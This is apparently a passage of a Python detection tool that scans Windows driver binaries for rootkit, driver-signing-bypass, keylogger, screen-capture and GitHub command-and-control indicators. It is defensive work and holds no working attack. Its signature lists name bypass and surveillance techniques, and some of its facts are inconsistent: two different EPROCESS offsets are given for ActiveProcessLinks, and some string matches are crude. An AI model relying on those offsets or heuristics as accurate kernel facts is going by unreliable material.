#!/usr/bin/env python3
"""
Windows kernel and driver reverse engineering surface.
Synthesized from: Practical Reverse Engineering (Dang/Gazet/Bachaalany, ch3)

Covers:
  - IOCTL code extraction (CTL_CODE macro decomposition, IRP_MJ_DEVICE_CONTROL dispatch)
  - DKOM (Direct Kernel Object Manipulation) rootkit artifact detection
  - SSDT (System Service Descriptor Table) hook detection
  - IRQL elevation capability detection
  - Driver signing enforcement bypass (DSEfix, g_CiEnabled, PatchGuard bypass)
"""

import struct
import re
import os
from typing import Optional, List, Dict


# ---------------------------------------------------------------------------
# CTL_CODE decomposition helpers
# ---------------------------------------------------------------------------

def _decode_ioctl(code: int) -> Optional[Dict]:
    """
    Decompose a 32-bit IOCTL value using the CTL_CODE macro layout:
      bits 31-16 = DeviceType
      bits 15-14 = RequiredAccess
      bits 13-2  = FunctionCode
      bits  1-0  = TransferType
    Returns None if the value doesn't look like a plausible IOCTL.
    """
    device_type = (code >> 16) & 0xFFFF
    access      = (code >> 14) & 0x3
    function    = (code >>  2) & 0xFFF
    transfer    = code & 0x3

    # Plausibility filter: device type must be in a known/custom range
    known_device_types = {
        0x00: "FILE_DEVICE_BEEP",
        0x01: "FILE_DEVICE_CD_ROM",
        0x02: "FILE_DEVICE_CD_ROM_FILE_SYSTEM",
        0x03: "FILE_DEVICE_CONTROLLER",
        0x04: "FILE_DEVICE_DATALINK",
        0x05: "FILE_DEVICE_DFS",
        0x06: "FILE_DEVICE_DISK",
        0x07: "FILE_DEVICE_DISK_FILE_SYSTEM",
        0x08: "FILE_DEVICE_FILE_SYSTEM",
        0x09: "FILE_DEVICE_INPORT_PORT",
        0x0a: "FILE_DEVICE_KEYBOARD",
        0x0b: "FILE_DEVICE_MAILSLOT",
        0x0c: "FILE_DEVICE_MIDI_IN",
        0x0d: "FILE_DEVICE_MIDI_OUT",
        0x0e: "FILE_DEVICE_MOUSE",
        0x0f: "FILE_DEVICE_MULTI_UNC_PROVIDER",
        0x10: "FILE_DEVICE_NAMED_PIPE",
        0x11: "FILE_DEVICE_NETWORK",
        0x12: "FILE_DEVICE_NETWORK_BROWSER",
        0x13: "FILE_DEVICE_NETWORK_FILE_SYSTEM",
        0x14: "FILE_DEVICE_NULL",
        0x15: "FILE_DEVICE_PARALLEL_PORT",
        0x16: "FILE_DEVICE_PHYSICAL_NETCARD",
        0x17: "FILE_DEVICE_PRINTER",
        0x18: "FILE_DEVICE_SCANNER",
        0x19: "FILE_DEVICE_SERIAL_MOUSE_PORT",
        0x1a: "FILE_DEVICE_SERIAL_PORT",
        0x1b: "FILE_DEVICE_SCREEN",
        0x1c: "FILE_DEVICE_SOUND",
        0x1d: "FILE_DEVICE_STREAMS",
        0x1e: "FILE_DEVICE_TAPE",
        0x1f: "FILE_DEVICE_TAPE_FILE_SYSTEM",
        0x20: "FILE_DEVICE_TRANSPORT",
        0x21: "FILE_DEVICE_UNKNOWN",
        0x22: "FILE_DEVICE_VIDEO",
        0x23: "FILE_DEVICE_VIRTUAL_DISK",
        0x24: "FILE_DEVICE_WAVE_IN",
        0x25: "FILE_DEVICE_WAVE_OUT",
        0x26: "FILE_DEVICE_8042_PORT",
        0x27: "FILE_DEVICE_NETWORK_REDIRECTOR",
        0x28: "FILE_DEVICE_BATTERY",
        0x29: "FILE_DEVICE_BUS_EXTENDER",
        0x2a: "FILE_DEVICE_MODEM",
        0x2b: "FILE_DEVICE_VDM",
        0x2c: "FILE_DEVICE_MASS_STORAGE",
        0x2d: "FILE_DEVICE_SMB",
        0x2e: "FILE_DEVICE_KS",
        0x2f: "FILE_DEVICE_CHANGER",
        0x30: "FILE_DEVICE_SMARTCARD",
        0x31: "FILE_DEVICE_ACPI",
        0x32: "FILE_DEVICE_DVD",
        0x33: "FILE_DEVICE_FULLSCREEN_VIDEO",
        0x34: "FILE_DEVICE_DFS_FILE_SYSTEM",
        0x35: "FILE_DEVICE_DFS_VOLUME",
        0x36: "FILE_DEVICE_SERENUM",
        0x37: "FILE_DEVICE_TERMSRV",
        0x38: "FILE_DEVICE_KSEC",
        0x39: "FILE_DEVICE_FIPS",
        0x3a: "FILE_DEVICE_INFINIBAND",
    }
    # Custom vendor range: 0x8000-0xFFFF
    is_custom = (device_type >= 0x8000)
    is_known  = (device_type in known_device_types)

    if not (is_custom or is_known):
        return None

    return {
        "device_type": device_type,
        "device_type_name": known_device_types.get(device_type, "CUSTOM/VENDOR"),
        "access": access,
        "function": function,
        "transfer": transfer,
        "is_custom": is_custom,
    }


# ---------------------------------------------------------------------------
# 1. IOCTL code scanner
# ---------------------------------------------------------------------------

def scan_ioctl_codes(binary_data: bytes) -> List[Dict]:
    """
    Scan for IOCTL codes in a binary.

    Strategy:
    - Walk every aligned DWORD in the binary; decode via CTL_CODE layout.
    - Prefer custom device type range (0x8000-0xFFFF) — vendor-defined.
    - Also match common MS device types (disk=0x07, network=0x12, unknown=0x21).
    - Additionally scan for the IRP_MJ_DEVICE_CONTROL dispatch table byte (0x0e)
      appearing at aligned DWORD boundaries adjacent to code pointers (heuristic).
    """
    findings: List[Dict] = []
    seen: set = set()
    data_len = len(binary_data)

    # Scan aligned DWORDs
    for offset in range(0, data_len - 3, 4):
        code = struct.unpack_from("<I", binary_data, offset)[0]

        if code in seen:
            continue

        info = _decode_ioctl(code)
        if info is None:
            continue

        seen.add(code)
        dt   = info["device_type"]
        acc  = info["access"]
        fn   = info["function"]
        tr   = info["transfer"]
        name = info["device_type_name"]

        detail = (
            f"IOCTL 0x{code:08X} "
            f"DeviceType=0x{dt:04X}({name}) "
            f"Access=0x{acc:X} "
            f"Func=0x{fn:X} "
            f"Transfer=0x{tr:X}"
        )

        findings.append({
            "severity": "LOW",
            "title": "IOCTL_CODE_FOUND",
            "detail": detail,
            "offset": offset,
            "host": "localhost",
            "port": 0,
        })

    return findings


# ---------------------------------------------------------------------------
# 2. DKOM artifact detection
# ---------------------------------------------------------------------------

def detect_dkom_artifacts(binary_data: bytes) -> List[Dict]:
    """
    Detect DKOM (Direct Kernel Object Manipulation) rootkit artifacts.

    Looks for:
    - PsActiveProcessHead string or LEA RCX pattern near it
    - ActiveProcessLinks string (EPROCESS linked list manipulation)
    - PsLookupProcessByProcessId string (process injection/hiding)
    - Flink/Blink write patterns at known EPROCESS offsets (Win10: 0x448/0x450)
    """
    findings: List[Dict] = []

    # --- ActiveProcessLinks string presence ---
    if b"ActiveProcessLinks" in binary_data:
        findings.append({
            "severity": "HIGH",
            "title": "DKOM_PROCESS_HIDING_STRINGS",
            "detail": "ActiveProcessLinks string found — DKOM process hiding pattern",
            "host": "localhost",
            "port": 0,
        })

    # --- PsActiveProcessHead reference ---
    if b"PsActiveProcessHead" in binary_data:
        findings.append({
            "severity": "HIGH",
            "title": "DKOM_PSACTIVEPROCESSHEAD",
            "detail": "PsActiveProcessHead string found — process list root manipulation",
            "host": "localhost",
            "port": 0,
        })

    # LEA RCX, [RIP+offset] — x64 pattern used to reference PsActiveProcessHead
    # \x48\x8D\x0D followed by 4-byte displacement
    lea_rcx = re.compile(b"\x48\x8D\x0D.{4}", re.DOTALL)
    for m in lea_rcx.finditer(binary_data):
        offset = m.start()
        # Check if there's a PsActiveProcessHead string within ±512 bytes
        window_start = max(0, offset - 512)
        window_end   = min(len(binary_data), offset + 512)
        window = binary_data[window_start:window_end]
        if b"PsActiveProcessHead" in window:
            findings.append({
                "severity": "HIGH",
                "title": "DKOM_LEA_RCX_PSACTIVEPROCESSHEAD",
                "detail": (
                    f"LEA RCX,[RIP+disp] at offset 0x{offset:X} "
                    "near PsActiveProcessHead — x64 list-head reference"
                ),
                "host": "localhost",
                "port": 0,
            })
            break  # one is enough

    # --- FLINK/BLINK manipulation ---
    # Win10 x64 EPROCESS ActiveProcessLinks at offset 0x448 (Flink) / 0x450 (Blink)
    # Search for the byte sequences 0x48,0x04,0x00 and 0x50,0x04,0x00 (little-endian offsets)
    # as MOV [Rxx+0x448] or MOV [Rxx+0x450] patterns
    flink_pattern = re.compile(b"\x89[\x80-\xBF]\x48\x04\x00\x00|\x48\x89[\x80-\xBF]\x48\x04\x00\x00", re.DOTALL)
    blink_pattern = re.compile(b"\x89[\x80-\xBF]\x50\x04\x00\x00|\x48\x89[\x80-\xBF]\x50\x04\x00\x00", re.DOTALL)

    has_flink = bool(flink_pattern.search(binary_data))
    has_blink = bool(blink_pattern.search(binary_data))

    if has_flink and has_blink:
        findings.append({
            "severity": "HIGH",
            "title": "DKOM_FLINK_BLINK_WRITE",
            "detail": (
                "Paired Flink/Blink writes at EPROCESS+0x448/0x450 "
                "— Win10 x64 ActiveProcessLinks unlink pattern"
            ),
            "host": "localhost",
            "port": 0,
        })
    elif has_flink or has_blink:
        which = "Flink" if has_flink else "Blink"
        findings.append({
            "severity": "MEDIUM",
            "title": "DKOM_LIST_ENTRY_WRITE",
            "detail": f"{which} write at EPROCESS+0x448/0x450 — partial DKOM list manipulation",
            "host": "localhost",
            "port": 0,
        })

    # --- PsLookupProcessByProcessId ---
    if b"PsLookupProcessByProcessId" in binary_data:
        findings.append({
            "severity": "MEDIUM",
            "title": "DKOM_PROCESS_LOOKUP_API",
            "detail": "PsLookupProcessByProcessId referenced — process lookup API (rootkit injection pattern)",
            "host": "localhost",
            "port": 0,
        })

    return findings


# ---------------------------------------------------------------------------
# 3. SSDT hook detection
# ---------------------------------------------------------------------------

def detect_ssdt_hook(binary_data: bytes) -> List[Dict]:
    """
    Detect SSDT (System Service Descriptor Table) hook indicators.

    Looks for:
    - KiServiceTable string (SSDT base array)
    - KeServiceDescriptorTable string (exported SSDT pointer)
    - RET+NOP sequences (hook trampolines / shadow SSDT gap fillers)
    - ZwQuerySystemInformation / NtQuerySystemInformation (classic SSDT hook target)
    """
    findings: List[Dict] = []

    # --- KiServiceTable ---
    if b"KiServiceTable" in binary_data:
        findings.append({
            "severity": "HIGH",
            "title": "SSDT_KISERVICETABLE_REF",
            "detail": "KiServiceTable string found — SSDT base array reference (hook possible)",
            "host": "localhost",
            "port": 0,
        })

    # --- KeServiceDescriptorTable ---
    if b"KeServiceDescriptorTable" in binary_data:
        findings.append({
            "severity": "HIGH",
            "title": "SSDT_KESERVICEDESCRIPTORTABLE_REF",
            "detail": "KeServiceDescriptorTable string found — exported SSDT pointer reference",
            "host": "localhost",
            "port": 0,
        })

    # --- RET + NOP trampoline pattern (\xC3\x90) ---
    # Shadow SSDT is typically 0x40 bytes after the primary table base.
    # Presence of RET/NOP sequences in driver code is a trampoline indicator.
    ret_nop_pattern = re.compile(b"\xC3\x90{1,16}")
    ret_nop_matches = list(ret_nop_pattern.finditer(binary_data))
    if len(ret_nop_matches) >= 2:
        findings.append({
            "severity": "MEDIUM",
            "title": "SSDT_RET_NOP_TRAMPOLINE",
            "detail": (
                f"{len(ret_nop_matches)} RET+NOP sequences found "
                "— hook trampoline / shadow SSDT stub pattern"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- ZwQuerySystemInformation / NtQuerySystemInformation ---
    for api in (b"ZwQuerySystemInformation", b"NtQuerySystemInformation"):
        if api in binary_data:
            findings.append({
                "severity": "MEDIUM",
                "title": "SSDT_SYSINFO_HOOK_TARGET",
                "detail": (
                    f"{api.decode()} referenced "
                    "— classic SSDT hook target for process/module hiding"
                ),
                "host": "localhost",
                "port": 0,
            })

    return findings


# ---------------------------------------------------------------------------
# 4. IRQL elevation detection
# ---------------------------------------------------------------------------

def detect_irql_elevation(binary_data: bytes) -> List[Dict]:
    """
    Detect IRQL manipulation patterns in driver binaries.

    IRQL (Interrupt Request Level) governs which code can pre-empt which.
    Misuse enables races, deadlocks, and BSoD-based DoS.

    Looks for:
    - KfRaiseIrql / KeRaiseIrql imports/strings
    - DISPATCH_LEVEL constant (2) following raise patterns
    - DIRQL references (hardware interrupt level)
    """
    findings: List[Dict] = []

    # --- KfRaiseIrql / KeRaiseIrql ---
    for api in (b"KfRaiseIrql", b"KeRaiseIrql", b"KeLowerIrql"):
        if api in binary_data:
            findings.append({
                "severity": "MEDIUM",
                "title": "IRQL_RAISE_API",
                "detail": f"{api.decode()} referenced — IRQL elevation capability present",
                "host": "localhost",
                "port": 0,
            })

    # --- DISPATCH_LEVEL (2) value pattern after KeRaiseIrql call ---
    # Pattern: MOV [reg], 0x02 or PUSH 0x02 before a CALL — simplified heuristic
    dispatch_level_pattern = re.compile(b"\x6a\x02|\xb2\x02|\xb0\x02")
    matches = list(dispatch_level_pattern.finditer(binary_data))
    if matches:
        # Check if any raise API is present — combined = elevated IRQL usage
        raise_present = any(api in binary_data for api in (b"KfRaiseIrql", b"KeRaiseIrql"))
        if raise_present:
            findings.append({
                "severity": "MEDIUM",
                "title": "IRQL_DISPATCH_LEVEL_USAGE",
                "detail": (
                    f"DISPATCH_LEVEL (2) constant pattern at {len(matches)} location(s) "
                    "with IRQL raise API — code runs at DISPATCH_LEVEL"
                ),
                "host": "localhost",
                "port": 0,
            })

    # --- DIRQL reference ---
    if b"DIRQL" in binary_data or b"KeAcquireSpinLockAtDpcLevel" in binary_data:
        findings.append({
            "severity": "HIGH",
            "title": "IRQL_DIRQL_REFERENCE",
            "detail": "DIRQL/DPC-level spinlock reference — hardware interrupt level execution",
            "host": "localhost",
            "port": 0,
        })

    return findings


# ---------------------------------------------------------------------------
# 5. Driver signing bypass detection
# ---------------------------------------------------------------------------

def detect_driver_signing_bypass(binary_data: bytes) -> List[Dict]:
    """
    Detect driver code signing enforcement bypass artifacts.

    On modern Windows, kernel-mode code must be signed (DSE — Driver Signing
    Enforcement). Bypass techniques include patching CI.DLL's g_CiEnabled,
    DSEfix, BCD testsigning, and PatchGuard circumvention.

    Looks for:
    - DSEfix signature bytes
    - g_CiEnabled string (CI.DLL integrity-check patch target)
    - bcdedit / testsigning / nointegritychecks strings
    - PatchGuard / KPP strings
    """
    findings: List[Dict] = []

    # --- DSEfix tool signature ---
    # ASCII: "DSEfix"
    dsefix_sig = b"\x44\x53\x45\x66\x69\x78"
    if dsefix_sig in binary_data:
        findings.append({
            "severity": "HIGH",
            "title": "DSEFIX_SIGNATURE",
            "detail": "DSEfix tool signature found (0x4453456669) — DSE patch tool embedded",
            "host": "localhost",
            "port": 0,
        })

    # --- g_CiEnabled (CI.DLL PatchGuard bypass) ---
    if b"g_CiEnabled" in binary_data:
        findings.append({
            "severity": "CRITICAL",
            "title": "DSE_CI_ENABLED_PATCH",
            "detail": (
                "g_CiEnabled string found — CI.DLL integrity-check bypass; "
                "patching this variable disables kernel code signing enforcement"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- BCD store manipulation ---
    bcd_strings = [
        (b"testsigning", "BCD testsigning flag"),
        (b"nointegritychecks", "BCD nointegritychecks flag"),
        (b"bcdedit", "bcdedit BCD editor"),
        (b"TESTSIGNING", "BCD testsigning flag (upper)"),
        (b"NOINTEGRITYCHECKS", "BCD nointegritychecks flag (upper)"),
    ]
    for sig, desc in bcd_strings:
        if sig in binary_data:
            findings.append({
                "severity": "HIGH",
                "title": "DSE_BCD_MANIPULATION",
                "detail": f"{desc} string found — BCD store manipulation for DSE bypass",
                "host": "localhost",
                "port": 0,
            })

    # --- PatchGuard / KPP bypass ---
    for sig in (b"PatchGuard", b"KPP", b"KernelPatchProtection"):
        if sig in binary_data:
            findings.append({
                "severity": "CRITICAL",
                "title": "PATCHGUARD_BYPASS",
                "detail": (
                    f"{sig.decode()} string found — PatchGuard (KPP) bypass reference; "
                    "disables kernel self-integrity protection"
                ),
                "host": "localhost",
                "port": 0,
            })

    return findings


# ---------------------------------------------------------------------------
# 6. IRP hook detection
# ---------------------------------------------------------------------------

def detect_irp_hook_patterns(binary_data: bytes) -> List[Dict]:
    """
    Detect IRP (I/O Request Packet) dispatch table hook patterns.

    Looks for:
    - Consecutive IRP_MJ_* dispatch table sequence (0x00-0x1B)
    - Dispatch table pointers outside kernel address range (x64: 0xFFFF8000-0xFFFFFFFF)
    - IofCallDriver / IoCallDriver indirect CALL pattern (FF 15 in x64)
    - ObRegisterCallbacks string (process/thread monitoring hook)
    """
    findings: List[Dict] = []

    # --- Consecutive IRP_MJ dispatch table sequence 0x00..0x1B ---
    # IRP_MJ_CREATE=0x00 through IRP_MJ_MAXIMUM_FUNCTION=0x1B as byte sequence
    irp_mj_seq = bytes(range(0x00, 0x1C))  # 28 bytes: 0x00-0x1B
    if irp_mj_seq in binary_data:
        findings.append({
            "severity": "MEDIUM",
            "title": "IRP_DISPATCH_TABLE_SEQUENCE",
            "detail": (
                "Consecutive IRP_MJ_* constant sequence (0x00-0x1B) found "
                "— full dispatch table present in binary"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- Dispatch table pointer outside kernel range ---
    # In x64 kernel space, valid pointers are >= 0xFFFF800000000000.
    # We scan every aligned QWORD and flag those in DWORD range (user/low address).
    # Only flag if near an IRP_MJ sequence pattern as context guard.
    kernel_low = 0xFFFF800000000000
    data_len = len(binary_data)
    suspect_ptrs = 0
    for offset in range(0, data_len - 7, 8):
        ptr = struct.unpack_from("<Q", binary_data, offset)[0]
        # Non-zero, non-kernel pointer in DWORD range (0x1000 - 0xFFFFFFFF)
        if 0x1000 <= ptr <= 0xFFFFFFFF:
            # Context: check if within 256 bytes of any IRP_MJ byte (0x00-0x1B)
            window = binary_data[max(0, offset - 256):min(data_len, offset + 256)]
            if any(b in window for b in [b"\x00\x01\x02\x03", b"\x04\x05\x06\x07"]):
                suspect_ptrs += 1
    if suspect_ptrs > 0:
        findings.append({
            "severity": "HIGH",
            "title": "IRP_DISPATCH_HOOK_OUTSIDE_KERNEL_RANGE",
            "detail": (
                f"{suspect_ptrs} QWORD pointer(s) below kernel range (0xFFFF800000000000) "
                "found near IRP_MJ context — IRP dispatch table hook to user/low address"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- IofCallDriver / IoCallDriver indirect CALL (FF 15 in x64) ---
    # FF 15 <4-byte RIP-relative offset> = CALL QWORD PTR [RIP+disp]
    indirect_call = re.compile(b"\xFF\x15.{4}", re.DOTALL)
    for api in (b"IofCallDriver", b"IoCallDriver"):
        if api in binary_data:
            # Check for indirect call pattern within 512 bytes of any occurrence
            idx = 0
            while True:
                pos = binary_data.find(api, idx)
                if pos == -1:
                    break
                window = binary_data[max(0, pos - 512):min(data_len, pos + 512)]
                if indirect_call.search(window):
                    findings.append({
                        "severity": "MEDIUM",
                        "title": "IRPCALLDRIVER_INDIRECT_HOOK",
                        "detail": (
                            f"{api.decode()} with adjacent FF 15 indirect CALL pattern "
                            "— IRP forwarding via indirect dispatch (hook vector)"
                        ),
                        "host": "localhost",
                        "port": 0,
                    })
                    break
                idx = pos + 1

    # --- ObRegisterCallbacks ---
    if b"ObRegisterCallbacks" in binary_data:
        findings.append({
            "severity": "HIGH",
            "title": "OBJECT_CALLBACK_REGISTRATION",
            "detail": (
                "ObRegisterCallbacks string found "
                "— process/thread monitoring hook registration via object callbacks"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


# ---------------------------------------------------------------------------
# 7. Filter driver artifact detection
# ---------------------------------------------------------------------------

def detect_filter_driver_artifacts(binary_data: bytes) -> List[Dict]:
    """
    Detect filter driver and minifilter framework artifacts.

    Looks for:
    - FltRegisterFilter (minifilter registration)
    - IoAttachDeviceToDeviceStack (legacy filter stack attach)
    - FltGetRequestorProcessId (minifilter process context access)
    - FLT_CALLBACK / FLTFL_OPERATION_FLAG_ strings (minifilter callback registration)
    """
    findings: List[Dict] = []

    if b"FltRegisterFilter" in binary_data:
        findings.append({
            "severity": "HIGH",
            "title": "MINIFILTER_DRIVER_REGISTERED",
            "detail": (
                "FltRegisterFilter string found "
                "— minifilter driver registration (filesystem/network filter hook)"
            ),
            "host": "localhost",
            "port": 0,
        })

    if b"IoAttachDeviceToDeviceStack" in binary_data:
        findings.append({
            "severity": "HIGH",
            "title": "LEGACY_FILTER_DEVICE_STACK_ATTACH",
            "detail": (
                "IoAttachDeviceToDeviceStack string found "
                "— legacy filter driver attaching to device stack"
            ),
            "host": "localhost",
            "port": 0,
        })

    if b"FltGetRequestorProcessId" in binary_data:
        findings.append({
            "severity": "MEDIUM",
            "title": "MINIFILTER_PROCESS_CONTEXT_ACCESS",
            "detail": (
                "FltGetRequestorProcessId string found "
                "— minifilter accessing requestor process context (process surveillance)"
            ),
            "host": "localhost",
            "port": 0,
        })

    for sig in (b"FLTFL_OPERATION_FLAG_", b"FLT_CALLBACK"):
        if sig in binary_data:
            findings.append({
                "severity": "MEDIUM",
                "title": "MINIFILTER_CALLBACK_REGISTERED",
                "detail": (
                    f"{sig.decode()} string found "
                    "— minifilter operation callback registered"
                ),
                "host": "localhost",
                "port": 0,
            })

    return findings


# ---------------------------------------------------------------------------
# 8. DKOM process hiding detection
# ---------------------------------------------------------------------------

def detect_dkom_process_hiding(binary_data: bytes) -> List[Dict]:
    """
    Detect DKOM-specific process hiding patterns beyond general DKOM artifacts.

    Looks for:
    - RemoveEntryList (FLINK/BLINK unlink — process hiding)
    - InitializeListHead (list setup for DKOM)
    - Win10 x64 EPROCESS offsets: 0x02e0 (UniqueProcessId), 0x02e8 (ActiveProcessLinks),
      0x048a (ProtectedProcess) as little-endian WORDs in binary
    - KeAcquireSpinLock kernel synchronization (DKOM spinlock usage)
    """
    findings: List[Dict] = []

    if b"RemoveEntryList" in binary_data:
        findings.append({
            "severity": "HIGH",
            "title": "DKOM_LIST_UNLINK",
            "detail": (
                "RemoveEntryList string found "
                "— process hiding via FLINK/BLINK LIST_ENTRY manipulation"
            ),
            "host": "localhost",
            "port": 0,
        })

    if b"InitializeListHead" in binary_data:
        findings.append({
            "severity": "MEDIUM",
            "title": "LIST_INITIALIZATION",
            "detail": (
                "InitializeListHead string found "
                "— list head initialization (potential DKOM setup)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # Win10 x64 EPROCESS offsets as little-endian WORDs
    # 0x02e0 -> b'\xe0\x02', 0x02e8 -> b'\xe8\x02', 0x048a -> b'\x8a\x04'
    eprocess_offsets = {
        b"\xe0\x02": "0x02e0 (UniqueProcessId)",
        b"\xe8\x02": "0x02e8 (ActiveProcessLinks)",
        b"\x8a\x04": "0x048a (ProtectedProcess)",
    }
    matched_offsets = []
    for pattern, name in eprocess_offsets.items():
        if pattern in binary_data:
            matched_offsets.append(name)

    if len(matched_offsets) >= 2:
        findings.append({
            "severity": "HIGH",
            "title": "EPROCESS_OFFSETS_PRESENT",
            "detail": (
                f"Win10 x64 EPROCESS offset constants found: {', '.join(matched_offsets)} "
                "— DKOM target offsets for process hiding / protection manipulation"
            ),
            "host": "localhost",
            "port": 0,
        })

    if b"KeAcquireSpinLock" in binary_data or b"SpinLock" in binary_data:
        findings.append({
            "severity": "LOW",
            "title": "KERNEL_SPINLOCK_USED",
            "detail": (
                "KeAcquireSpinLock / SpinLock reference found "
                "— kernel spinlock synchronization (used during DKOM list manipulation)"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


# ---------------------------------------------------------------------------
# 9. Network rootkit pattern detection
# ---------------------------------------------------------------------------

def detect_network_rootkit_patterns(binary_data: bytes) -> List[Dict]:
    """
    Detect network stack hooking and filter registration patterns.

    Looks for:
    - NDIS hooks: NdisMRegisterMiniportDriver, NdisRegisterProtocolDriver
    - TDI filter: TdiRegisterPnPHandlers
    - Winsock Kernel: WskRegister
    - IP packet filter: PfCreateInterface
    - WFP (Windows Filtering Platform): FwpmTransactionBegin
    """
    findings: List[Dict] = []

    ndis_hooks = [
        b"NdisMRegisterMiniportDriver",
        b"NdisRegisterProtocolDriver",
    ]
    for api in ndis_hooks:
        if api in binary_data:
            findings.append({
                "severity": "HIGH",
                "title": "NDIS_HOOK_REGISTRATION",
                "detail": (
                    f"{api.decode()} string found "
                    "— NDIS miniport/protocol driver registration (network stack hook)"
                ),
                "host": "localhost",
                "port": 0,
            })

    if b"TdiRegisterPnPHandlers" in binary_data:
        findings.append({
            "severity": "HIGH",
            "title": "TDI_FILTER_INSTALLED",
            "detail": (
                "TdiRegisterPnPHandlers string found "
                "— TDI (Transport Driver Interface) filter installed (legacy network intercept)"
            ),
            "host": "localhost",
            "port": 0,
        })

    if b"WskRegister" in binary_data:
        findings.append({
            "severity": "MEDIUM",
            "title": "WSK_CLIENT_REGISTERED",
            "detail": (
                "WskRegister string found "
                "— Winsock Kernel client registered (kernel-mode network socket)"
            ),
            "host": "localhost",
            "port": 0,
        })

    if b"PfCreateInterface" in binary_data:
        findings.append({
            "severity": "MEDIUM",
            "title": "WFP_FILTER_LAYER_REGISTERED",
            "detail": (
                "PfCreateInterface string found "
                "— IP packet filter interface (legacy IP filter hook)"
            ),
            "host": "localhost",
            "port": 0,
        })

    if b"FwpmTransactionBegin" in binary_data:
        findings.append({
            "severity": "MEDIUM",
            "title": "WFP_FILTER_LAYER_REGISTERED",
            "detail": (
                "FwpmTransactionBegin string found "
                "— Windows Filtering Platform (WFP) filter layer registration"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


# ---------------------------------------------------------------------------
# 10. Extended top-level file orchestrator
# ---------------------------------------------------------------------------

def scan_kernel_binary_full(filepath: str) -> List[Dict]:
    """
    Extended orchestrator calling all kernel detection functions including
    IRP hooks, filter drivers, DKOM process hiding, and network rootkit patterns.

    Reads the file as raw bytes, runs all detection functions, and returns
    a combined findings list with consistent host/port keys.
    """
    findings: List[Dict] = []

    findings.append({
        "severity": "INFO",
        "title": "FILE_SCANNED",
        "detail": f"Extended Windows kernel rootkit scan: {filepath}",
        "host": "localhost",
        "port": 0,
    })

    try:
        with open(filepath, "rb") as fh:
            binary_data = fh.read()
    except OSError as exc:
        findings.append({
            "severity": "HIGH",
            "title": "FILE_READ_ERROR",
            "detail": f"Cannot read {filepath}: {exc}",
            "host": "localhost",
            "port": 0,
        })
        return findings

    for detect_fn in (
        scan_ioctl_codes,
        detect_dkom_artifacts,
        detect_ssdt_hook,
        detect_irql_elevation,
        detect_driver_signing_bypass,
        detect_irp_hook_patterns,
        detect_filter_driver_artifacts,
        detect_dkom_process_hiding,
        detect_network_rootkit_patterns,
    ):
        sub = detect_fn(binary_data)
        for f in sub:
            f.setdefault("host", "localhost")
            f.setdefault("port", 0)
        findings.extend(sub)

    return findings


# ---------------------------------------------------------------------------
# 6. GitHub C2, keylogger, screenshot, and trojan persistence detectors
#    (derived from Black Hat Python 2nd Ed., Chapters 7 & 8)
# ---------------------------------------------------------------------------

def detect_github_c2_indicators(binary_data: bytes) -> list:
    """Detect GitHub-based C2 artifacts embedded in a binary."""
    findings: list = []

    checks = [
        (b"api.github.com",            "HIGH",   "GITHUB_API_C2_STRING",     "GitHub-based C2 indicator"),
        (b"raw.githubusercontent.com", "HIGH",   "GITHUB_API_C2_STRING",     "GitHub-based C2 indicator (raw content URL)"),
        (b"gist.github.com",           "HIGH",   "GITHUB_GIST_C2",           "Gist polling C2 pattern"),
        (b"Authorization: token",      "HIGH",   "GITHUB_TOKEN_HARDCODED",   "Credential hardcoded in binary"),
        (b"github/linguist",           "MEDIUM", "GITHUB_USERAGENT_PRESENT", "GitHub CLI/Octokit User-Agent string"),
        (b"octokit",                   "MEDIUM", "GITHUB_USERAGENT_PRESENT", "Octokit User-Agent string"),
        (b"import_module\x00",         "MEDIUM", "DYNAMIC_MODULE_IMPORT",    "Trojan extensibility — dynamic import"),
        (b"ImportModuleFromString",    "MEDIUM", "DYNAMIC_MODULE_IMPORT",    "Trojan extensibility — ImportModuleFromString"),
    ]

    for pattern, severity, title, detail in checks:
        if pattern in binary_data:
            findings.append({
                "severity": severity,
                "title":    title,
                "detail":   detail,
                "host":     "localhost",
                "port":     0,
            })

    return findings


def detect_keylogger_patterns(binary_data: bytes) -> list:
    """Detect Windows keylogger artifacts in a binary."""
    findings: list = []

    # SetWindowsHookEx — ASCII and raw bytes
    if (
        b"SetWindowsHookEx" in binary_data
        or b"\x53\x65\x74\x57\x69\x6e\x64\x6f\x77\x73\x48\x6f\x6f\x6b\x45\x78" in binary_data
    ):
        findings.append({
            "severity": "CRITICAL",
            "title":    "SEWINDOWSHOOKEX",
            "detail":   "Global keyboard hook installed — SetWindowsHookEx present",
            "host":     "localhost",
            "port":     0,
        })

    simple_checks = [
        (b"GetAsyncKeyState",  "CRITICAL", "GETASYNCKEYSTATE",  "Polling-based keylogger — GetAsyncKeyState"),
        (b"WH_KEYBOARD_LL",    "HIGH",     "KEYBOARD_LL_HOOK",  "Low-level keyboard hook — WH_KEYBOARD_LL (0x0D)"),
        (b"WH_MOUSE_LL",       "MEDIUM",   "MOUSE_LL_HOOK",     "Mouse activity monitoring — WH_MOUSE_LL (0x0E)"),
        (b"RegisterHotKey",    "MEDIUM",   "REGISTERHOTKEY",    "Hot key monitoring — RegisterHotKey"),
    ]

    for pattern, severity, title, detail in simple_checks:
        if pattern in binary_data:
            findings.append({
                "severity": severity,
                "title":    title,
                "detail":   detail,
                "host":     "localhost",
                "port":     0,
            })

    return findings


def detect_screenshot_capture_patterns(binary_data: bytes) -> list:
    """Detect screen/clipboard capture artifacts in a binary."""
    findings: list = []

    # CreateDC + BitBlt within 512 bytes of each other
    dc_pos   = binary_data.find(b"CreateDC\x00")
    blt_pos  = binary_data.find(b"BitBlt\x00")
    if dc_pos != -1 and blt_pos != -1 and abs(dc_pos - blt_pos) <= 512:
        findings.append({
            "severity": "HIGH",
            "title":    "SCREENSHOT_CAPTURE_API",
            "detail":   "Screen capture capability — CreateDC + BitBlt within 512 bytes",
            "host":     "localhost",
            "port":     0,
        })

    # GetDC + GetSystemMetrics both present
    if b"GetDC\x00" in binary_data and b"GetSystemMetrics\x00" in binary_data:
        findings.append({
            "severity": "HIGH",
            "title":    "SCREEN_METRICS_CAPTURE",
            "detail":   "Screen metrics capture — GetDC + GetSystemMetrics",
            "host":     "localhost",
            "port":     0,
        })
